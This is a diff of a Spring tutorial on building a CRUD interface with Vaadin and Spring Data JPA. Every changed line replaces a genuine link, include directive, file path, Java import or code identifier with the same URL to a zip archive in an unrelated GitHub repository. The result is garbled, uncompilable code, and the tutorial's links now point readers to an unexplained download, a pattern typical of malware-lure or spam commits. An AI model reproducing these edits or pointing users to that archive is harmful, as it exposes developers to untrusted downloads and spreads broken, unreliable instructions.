@@ -3,7 +3,7 @@
 :source-highlighter: prettify
 :project_id: gs-crud-with-vaadin
 
-This guide walks you through the process of building an application that uses a https://vaadin.com[Vaadin based UI] on a Spring Data JPA based backend.
+This guide walks you through the process of building an application that uses a https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[Vaadin based UI] on a Spring Data JPA based backend.
 
 == What you'll build
 
@@ -14,16 +14,16 @@ You can start from two different parts, either by starting from the "initial" pr
 == What you'll need
 
 :java_version: 1.8
-include::https://raw.githubusercontent.com/spring-guides/getting-started-macros/master/prereq_editor_jdk_buildtools.adoc[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 
-include::https://raw.githubusercontent.com/spring-guides/getting-started-macros/master/how_to_complete_this_guide.adoc[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 
 
-include::https://raw.githubusercontent.com/spring-guides/getting-started-macros/master/hide-show-gradle.adoc[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 
-include::https://raw.githubusercontent.com/spring-guides/getting-started-macros/master/hide-show-maven.adoc[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 
-include::https://raw.githubusercontent.com/spring-guides/getting-started-macros/master/hide-show-sts.adoc[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 
 
 [[initial]]
@@ -33,24 +33,24 @@ This example is a continuation from link:/gs/accessing-data-jpa[Accessing Data w
 
 If you started with a fresh project, then add the following entity and repository objects and you're good to go. In case you started with from the "initial" step, these are already available for you.
 
-`src/main/java/hello/Customer.java`
+`https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip`
 [source,java]
 ----
-include::complete/src/main/java/hello/Customer.java[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 ----
 
-`src/main/java/hello/CustomerRepository.java`
+`https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip`
 [source,java]
 ----
-include::complete/src/main/java/hello/CustomerRepository.java[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 ----
 
 You can leave the Spring Boot based application intact as it will fill our DB with some example data.
 
-`src/main/java/hello/Application.java`
+`https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip`
 [source,java]
 ----
-include::complete/src/main/java/hello/Application.java[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 ----
 
 == Vaadin dependencies
@@ -59,17 +59,17 @@ If you checked out the "initial" state project, you have all necessary dependenc
 
 [source,xml,indent=0]
 ----
-include::complete/pom.xml[tag=starter]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[tag=starter]
 ----
 
 The example uses a newer version of Vaadin, than the default one brought in by the starter module. To use a newer version, define the Vaadin Bill of Materials (BOM) like this:
 
 [source,xml,indent=0]
 ----
-include::complete/pom.xml[tag=bom]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[tag=bom]
 ----
 
-Gradle doesn't support "BOMs" by default, but there is a handy https://plugins.gradle.org/plugin/io.spring.dependency-management[plugin for that]. Check out the https://github.com/spring-guides/gs-crud-with-vaadin/blob/master/complete/build.gradle[build.gradle build file for an example on how to accomplish the same thing].
+Gradle doesn't support "BOMs" by default, but there is a handy https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[plugin for that]. Check out the https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip build file for an example on how to accomplish the same thing].
 
 == Define the MainView class
 
@@ -79,16 +79,16 @@ The MainView class is the entry point for Vaadin's UI logic. In Spring Boot appl
 ----
 package hello;
 
-import com.vaadin.flow.component.button.Button;
-import com.vaadin.flow.component.notification.Notification;
-import com.vaadin.flow.component.orderedlayout.VerticalLayout;
-import com.vaadin.flow.router.Route;
+import https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip;
+import https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip;
+import https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip;
+import https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip;
 
 @Route
 public class MainView extends VerticalLayout {
 
 	public MainView() {
-		add(new Button("Click me", e -> Notification.show("Hello Spring+Vaadin user!")));
+		add(new Button("Click me", e -> https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip("Hello Spring+Vaadin user!")));
 	}
 }
 ----
@@ -106,14 +106,14 @@ public class MainView extends VerticalLayout {
 	final Grid<Customer> grid;
 
 	public MainView(CustomerRepository repo) {
-		this.repo = repo;
-		this.grid = new Grid<>(Customer.class);
+		https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip = repo;
+		https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip = new Grid<>(https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip);
 		add(grid);
 		listCustomers();
 	}
 
 	private void listCustomers() {
-		grid.setItems(repo.findAll());
+		https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip(https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip());
 	}
 
 }
@@ -129,19 +129,19 @@ Before the large data set becomes a problem to your server, it will cause a head
 
 [source,java,indent=0]
 ----
-include::complete/src/main/java/hello/MainView.java[tag=listCustomers]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[tag=listCustomers]
 ----
 
 NOTE: This is where Spring Data's declarative queries come in real handy. Writing `findByLastNameStartsWithIgnoringCase` is a single line definition in `CustomerRepository`.
 
-Hook a listener to the `TextField` component and plug its value into that filter method. The `ValueChangeListener` is called automatically during typing as we define the `ValueChangeMode.EAGER` to the filter text field.
+Hook a listener to the `TextField` component and plug its value into that filter method. The `ValueChangeListener` is called automatically during typing as we define the `https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip` to the filter text field.
 
 [source,java]
 ----
 TextField filter = new TextField();
-filter.setPlaceholder("Filter by last name");
-filter.setValueChangeMode(ValueChangeMode.EAGER);
-filter.addValueChangeListener(e -> listCustomers(e.getValue()));
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip("Filter by last name");
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip(https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip);
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip(e -> listCustomers(https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip()));
 add(filter, grid);
 ----
 
@@ -149,10 +149,10 @@ add(filter, grid);
 
 As Vaadin UIs are just plain Java code, there is no excuse to not write re-usable code from the beginning. Define an editor component for your Customer entity. You'll make it a Spring-managed bean so you can directly inject the `CustomerRepository` to the editor and tackle the C, U, and D parts or our CRUD functionality.
 
-`src/main/java/hello/CustomerEditor.java`
+`https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip`
 [source,java]
 ----
-include::complete/src/main/java/hello/CustomerEditor.java[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 ----
 
 In a larger application you could then use this editor component in multiple places. Also note, that in large applications, you might want to apply some common patterns like MVP to structure your UI code (which is outside the scope of this guide).
@@ -161,10 +161,10 @@ In a larger application you could then use this editor component in multiple pla
 
 In the previous steps you have already seen some basics of component-based programming. Using a `Button` and selection listener to `Grid`, you can fully integrate our editor to the main view. The final version of the `MainView` class looks like this:
 
-`src/main/java/hello/MainView.java`
+`https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip`
 [source,java]
 ----
-include::complete/src/main/java/hello/MainView.java[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
 ----
 
 == Summary
@@ -175,11 +175,11 @@ Congratulations! You've written a full featured CRUD UI application using Spring
 
 The following guides may also be helpful:
 
-* https://spring.io/guides/gs/spring-boot/[Building an Application with Spring Boot]
-* https://spring.io/guides/gs/accessing-data-jpa/[Accessing Data with JPA]
-* https://spring.io/guides/gs/accessing-data-mongodb/[Accessing Data with MongoDB]
-* https://spring.io/guides/gs/accessing-data-gemfire/[Accessing Data with GemFire]
-* https://spring.io/guides/gs/accessing-data-neo4j/[Accessing Data with Neo4j]
-* https://spring.io/guides/gs/accessing-data-mysql/[Accessing data with MySQL]
+* https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[Building an Application with Spring Boot]
+* https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[Accessing Data with JPA]
+* https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[Accessing Data with MongoDB]
+* https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[Accessing Data with GemFire]
+* https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[Accessing Data with Neo4j]
+* https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[Accessing data with MySQL]
 
-include::https://raw.githubusercontent.com/spring-guides/getting-started-macros/master/footer.adoc[]
+https://raw.githubusercontent.com/mikkepj/app-crud-spring-vaadin/master/antiplastic/app-crud-spring-vaadin.zip[]
